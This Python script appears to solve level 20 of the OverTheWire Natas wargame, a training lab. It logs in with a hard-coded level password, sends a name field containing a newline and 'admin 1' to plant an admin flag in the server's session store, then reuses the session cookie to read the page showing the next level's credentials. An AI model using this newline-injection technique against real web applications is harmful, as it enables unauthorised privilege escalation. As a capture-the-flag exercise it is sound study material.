from requests import post, get
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup


url = "http://natas20.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas20", "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF")
r1 = post(
  url = url,
  data= {
    "name": "name\nadmin 1"
  },
  auth = auth
)


r2 = get(
  url = url,
  cookies = r1.cookies,
  auth = auth,
)
soup = BeautifulSoup(r2.text)

print(soup.get_text().replace("View sourcecode", "").replace("natas20", "").replace("Your name:", ""))